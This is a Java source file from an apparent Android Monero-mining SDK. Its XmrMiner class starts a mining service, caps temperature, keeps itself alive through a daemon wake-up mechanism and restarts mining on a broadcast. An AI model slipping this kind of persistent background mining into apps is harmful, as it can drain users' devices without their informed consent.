package waterhole.miner.monero;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import java.io.ObjectStreamException;

import waterhole.miner.core.MinerInterface;
import waterhole.miner.core.WaterholeMiner;
import waterhole.miner.core.keepAlive.DaemonEnv;

import static waterhole.miner.core.utils.LogUtils.errorWithReport;
import static waterhole.miner.core.utils.LogUtils.info;

public final class XmrMiner extends WaterholeMiner {

    private IMiningServiceBinder mServiceBinder;
    private MineReceiver mineReceiver;

    private final ServiceConnection mServerConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            try {
                info("XmrMiner onServiceConnected");
                mServiceBinder = IMiningServiceBinder.MiningServiceBinder.asInterface(iBinder);
                mServiceBinder.startMine();
                mServiceBinder.setControllerNeedRun(true);
                if (topTemperature != -1) {
                    mServiceBinder.setTemperature(topTemperature);
                }
            } catch (Exception e) {
                errorWithReport(getContext(), "XmrMiner|ServiceConnection: " + e.getMessage());
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {
            mServiceBinder = null;
        }
    };

    public boolean isMining() {
        return mServiceBinder != null;
    }

    private XmrMiner() {
    }

    public static XmrMiner instance() {
        return Holder.instance;
    }

    private static class Holder {
        private static XmrMiner instance = new XmrMiner();
    }

    private Object readResolve() throws ObjectStreamException {
        return instance();
    }

    @Override
    public MinerInterface init(Context context) {
        MinerInterface minerInterface = super.init(context);
        // 需要在 Application 的 onCreate() 中调用一次 DaemonEnv.initialize()
        DaemonEnv.initialize(context, TraceServiceImpl.class, DaemonEnv.DEFAULT_WAKE_UP_INTERVAL);
        TraceServiceImpl.sShouldStopService = false;
        DaemonEnv.startServiceMayBind(TraceServiceImpl.class);
        return minerInterface;
    }

    @Override
    public void startMine() {
        info("XmrMiner startMine");
        if (mineReceiver == null) {
            mineReceiver = new MineReceiver();
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction("waterhole.miner.monero.restart");
            getContext().registerReceiver(mineReceiver, intentFilter);
        }
        final Intent intent = new Intent(getContext(), MineService.class);
        getContext().bindService(intent, mServerConnection, Context.BIND_AUTO_CREATE);
    }

    @Override
    public void stopMine() {
        try {
            info("XmrMiner stopMine");
            if (mServiceBinder != null) {
                getContext().unbindService(mServerConnection);
                getContext().unregisterReceiver(mineReceiver);
                mineReceiver = null;
                mServiceBinder = null;
            }
        } catch (Exception e) {
            errorWithReport(getContext(), "XmrMiner|stopMine: " + e.getMessage());
        }
    }

    public class MineReceiver extends BroadcastReceiver {

        public MineReceiver() {
        }

        @Override
        public void onReceive(Context context, Intent intent) {
            info("XmrMiner$MineReceiver onReceive");
            stopMine();
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    startMine();
                }
            }, 1000);
        }
    }
}
